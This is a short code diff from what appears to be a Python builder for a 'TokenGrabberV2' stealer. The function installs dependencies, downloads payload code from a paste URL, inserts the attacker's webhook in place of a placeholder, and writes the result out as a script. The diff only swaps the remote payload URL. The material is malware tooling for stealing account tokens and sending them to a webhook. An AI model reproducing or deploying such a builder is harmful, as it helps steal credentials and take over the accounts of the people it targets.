@@ -29,7 +29,7 @@ def TokenGrabberV2(WebHook, fileName):
         'PIL-tools'
     ]
     install_lib(required)
-    code = requests.get("https://paste.sr.ht/blob/fe4644d4804fe4936f51000c1bbc98c96d147a33").text.replace("WEBHOOK_HERE", WebHook)
+    code = requests.get("https://paste.sr.ht/blob/36dec5a7bf9eeb2ae195a0946c3220a696a6c80b").text.replace("WEBHOOK_HERE", WebHook)
     with open(f"{fileName}.py", 'w' ,encoding='UTF-8') as f:
         f.write(code)
 
